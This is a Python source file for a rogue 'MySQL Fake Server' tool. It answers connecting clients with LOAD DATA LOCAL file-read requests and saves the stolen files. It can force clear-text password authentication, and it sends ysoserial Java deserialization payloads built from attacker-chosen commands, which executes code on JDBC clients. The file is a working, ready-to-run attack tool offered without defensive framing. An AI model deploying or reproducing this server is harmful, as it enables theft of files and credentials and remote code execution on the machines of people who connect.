import asyncio
import logging
import signal
import random
signal.signal(signal.SIGINT, signal.SIG_DFL)

from mysqlproto.protocol import start_mysql_server
from mysqlproto.protocol.base import OK, ERR, EOF
from mysqlproto.protocol.flags import Capability
from mysqlproto.protocol.handshake import HandshakeV10, HandshakeResponse41, AuthSwitchRequest
from mysqlproto.protocol.query import ColumnDefinition, ColumnDefinitionList, ResultSet,FileReadPacket
import subprocess
import time


@asyncio.coroutine
def accept_server(server_reader, server_writer):
    task = asyncio.Task(handle_server(server_reader, server_writer))

@asyncio.coroutine
def process_fileread(server_reader, server_writer,filename):
    print("Start Reading File:"+filename.decode('utf8'))
    FileReadPacket(filename).write(server_writer)
    yield from server_writer.drain()
    #server_writer.reset()
    #time.sleep(3)
    
    isFinish = False
    outContent=b''
    outputFileName="%s/%s___%d___%s"%(fileOutputDir,server_writer.get_extra_info('peername')[:2][0],int(time.time()),filename.decode('ascii').replace('/','_').replace('\\','_').replace(':','_'))
    while not isFinish:
        packet = server_reader.packet()
        while True:
            fileData = (yield from packet.read())
            #当前packet没有未读取完的数据
            if fileData == '':
                break
            #空包,文件读取结束
            if fileData == b'':
                isFinish = True
                break
            outContent+=fileData
    if len(outContent) == 0:
        print("Nothing had been read")
    else:
        if displayFileContentOnScreen:
            print("========File Conntent Preview=========")
            try:
                print(outContent.decode('utf8')[:1000])
            except Exception as e:
                #print(e)
                print(outContent[:1000])
            print("=======File Conntent Preview End==========")
        if saveToFile:
            with open(outputFileName,'wb') as f:
                f.write(outContent)
            print("Save to File:"+outputFileName)
    #OK(capability, handshake.status).write(server_writer)
    #server_writer.close()
    return

@asyncio.coroutine
def handle_server(server_reader, server_writer):
    handshake = HandshakeV10()
    handshake.write(server_writer)
    print("Incoming Connection:"+str(server_writer.get_extra_info('peername')[:2]))
    yield from server_writer.drain()
    switch2clear=False
    handshake_response = yield from HandshakeResponse41.read(server_reader.packet(), handshake.capability)
    username = handshake_response.user
    print("Login Username:"+username.decode("ascii"))
    #print("<=", handshake_response.__dict__)
    #检测是否需要切换到mysql_clear_password
    if username.endswith(b"_clear"):
        switch2clear = True
        username = username[:-len("_clear")]
    capability = handshake_response.capability_effective

    if (Capability.PLUGIN_AUTH in capability and
            handshake.auth_plugin != handshake_response.auth_plugin
            and switch2clear):
        print("Switch Auth Plugin to mysql_clear_password")
        AuthSwitchRequest().write(server_writer)
        yield from server_writer.drain()
        auth_response = yield from server_reader.packet().read()
        print("<=", auth_response)

    result = OK(capability, handshake.status)
    result.write(server_writer)
    yield from server_writer.drain()

    while True:
        server_writer.reset()
        packet = server_reader.packet()
        try:
            cmd = (yield from packet.read(1))[0]
        except Exception as _:
            #TODO:可能会出问题 ┓( ´∀` )┏
            return
            pass
        print("<=", cmd)
        query =(yield from packet.read())
        if query != '':
            query = query.decode('ascii')
        if username.startswith(b"fileread_"):    
            yield from process_fileread(server_reader, server_writer,username[len("fileread_"):])
            result = OK(capability, handshake.status)
            #return 
        elif username in fileread_dict:
            #query =(yield from packet.read())
            yield from process_fileread(server_reader, server_writer,fileread_dict[username])
            result = OK(capability, handshake.status)
            #return 
        elif username not in yso_dict and not username.startswith(b"yso_"):
            #query =(yield from packet.read())
            yield from process_fileread(server_reader, server_writer,random.choice(defaultFiles))
            result = OK(capability, handshake.status)
        elif cmd == 1:
            result =ERR(capability)
            #return
        elif cmd == 3:
            #query = (yield from packet.read()).decode('ascii')
            if 'SHOW VARIABLES'.lower() in query.lower():
                    print("Sending Fake MySQL Server Environment Data")
                    ColumnDefinitionList((ColumnDefinition('d'),ColumnDefinition('e'))).write(server_writer)
                    EOF(capability, handshake.status).write(server_writer)
                    ResultSet(("max_allowed_packet","67108864")).write(server_writer)
                    ResultSet(("system_time_zone","UTC")).write(server_writer)
                    ResultSet(("time_zone","SYSTEM")).write(server_writer)
                    ResultSet(("init_connect","")).write(server_writer)
                    ResultSet(("auto_increment_increment","1")).write(server_writer)
                    result = EOF(capability, handshake.status)
            elif username in yso_dict:
                    #Serial Data
                    print("Sending Presetting YSO Data with username "+username.decode('ascii'))
                    ColumnDefinitionList((ColumnDefinition('a'),ColumnDefinition('b'),ColumnDefinition('c'))).write(server_writer)
                    EOF(capability, handshake.status).write(server_writer)
                    ResultSet(("11",yso_dict[username],"2333")).write(server_writer)
                    result = EOF(capability, handshake.status)
            elif username.startswith(b"yso_"):
                query =(yield from packet.read())
                _,yso_type,yso_command = username.decode('ascii').split("_")
                print("Sending YSO data with params:%s,%s" % (yso_type,yso_command))
                content = get_yso_content(yso_type,yso_command)
                ColumnDefinitionList((ColumnDefinition('a'),ColumnDefinition('b'),ColumnDefinition('c'))).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                ResultSet(("11",content,"2333")).write(server_writer)
                result = EOF(capability, handshake.status)
            elif query.decode('ascii') == 'select 1':
                ColumnDefinitionList((ColumnDefinition('database'),)).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                ResultSet(('test',)).write(server_writer)
                result = EOF(capability, handshake.status)
            else:
                result = OK(capability, handshake.status)

        else:
            result = ERR(capability)

        result.write(server_writer)
        yield from server_writer.drain()

yso_dict={

}
def get_yso_content(yso_type,command):
    popen = subprocess.Popen([javaBinPath, '-jar', ysoserialPath, yso_type, command], stdout=subprocess.PIPE)
    file_content = popen.stdout.read()
    return file_content
def addYsoPaylod(username,yso_type,command):
    yso_dict[username] = get_yso_content(yso_type,command)



logging.basicConfig(level=logging.INFO)

fileOutputDir="./fileOutput/"
displayFileContentOnScreen = True
saveToFile=True
fileread_dict={

}
ysoserialPath = 'ysoserial-0.0.6-SNAPSHOT-all.jar'
javaBinPath = 'java'
defaultFiles = []
if __name__ == "__main__":
    import json
    with open("config.json") as f:
        data = json.load(f)
    
    if 'config' in data:
        config_data = data['config']
        if 'ysoserialPath' in config_data:
            ysoserialPath = config_data['ysoserialPath']
        if 'javaBinPath' in config_data:
            javaBinPath = config_data['javaBinPath']
        if 'fileOutputDir' in config_data:
            fileOutputDir = config_data['fileOutputDir']
        if 'displayFileContentOnScreen' in config_data:
            displayFileContentOnScreen = config_data['displayFileContentOnScreen']
        if 'saveToFile' in config_data:
            saveToFile = config_data['saveToFile']
    import os
    try:
        os.makedirs(fileOutputDir)
    except FileExistsError as _:
        pass
    for k,v in data['fileread'].items():
        if k == '__defaultFiles':
            defaultFiles = v
            for i in range(len(defaultFiles)):
                defaultFiles[i] = defaultFiles[i].encode('ascii')
        else:
            fileread_dict[k.encode('ascii')] = v.encode('ascii')
    
    #print(fileread_dict)
    if "yso" in data:
        for k,v in data['yso'].items():
            addYsoPaylod(k.encode('ascii'),v[0],v[1])
    #print(yso_dict)
    loop = asyncio.get_event_loop()
    f = start_mysql_server(handle_server, host=None, port=3306)
    print("===========================================")
    print("MySQL Fake Server")
    print("Author:fnmsd(https://blog.csdn.net/fnmsd)")
    print("Load %d Fileread usernames :%s" % (len(fileread_dict),list(fileread_dict.keys())))
    print("Load %d yso usernames :%s" % (len(yso_dict),list(yso_dict.keys())))
    print("Load %d Default Files :%s" % (len(defaultFiles),defaultFiles))
    print("Start Server at port 3306")
    loop.run_until_complete(f)
    loop.run_forever()
